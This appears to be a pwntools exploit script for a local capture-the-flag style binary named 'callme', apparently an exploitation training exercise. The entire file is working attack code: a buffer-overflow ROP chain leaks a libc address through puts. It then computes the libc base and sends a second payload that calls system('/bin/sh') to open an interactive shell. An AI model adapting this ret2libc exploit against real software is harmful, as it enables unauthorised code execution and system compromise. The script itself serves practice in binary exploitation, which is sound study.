from pwn import *

elf = ELF('./callme')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)
io = elf.process()

pause()

padding = 40

pld = b""
pld += b"B" * padding 
pld += p64(0x00000000004009a3) # pop rdi ; ret 
pld += p64(elf.got['setvbuf'])
pld += p64(0x00000000004006be)
pld += p64(elf.plt['puts'])
pld += p64(0x00000000004006be) # ret
pld += p64(elf.sym['pwnme'])



io.sendlineafter(b"> ", pld)
io.recvline()
#leak = int(io.recvline().strip(), 16)
string = io.recvline().strip()
leak = int.from_bytes(string, byteorder='little')
#leak = u64(string.ljust(8, b"\x00"))
base = leak - libc.sym['setvbuf']

system = base + libc.sym['system']
#bin_sh = base + next(libc.search(b'/bin/sh\x00'))
bin_sh = base + next(libc.search(b'/bin/sh\x00'))

info(f"sevbuf leak: {hex(leak)}")
info(f"base is: {hex(base)}")
info(f"system: {hex(system)}")
info(f"/bin/sh: {hex(bin_sh)}")

pld = b""
pld += b"A" * padding
pld += p64(0x00000000004009a3) # pop rdi ; ret 
pld += p64(bin_sh)
pld += p64(0x00000000004006be) # ret
pld += p64(system)



io.sendlineafter(b"> ", pld)

io.interactive()
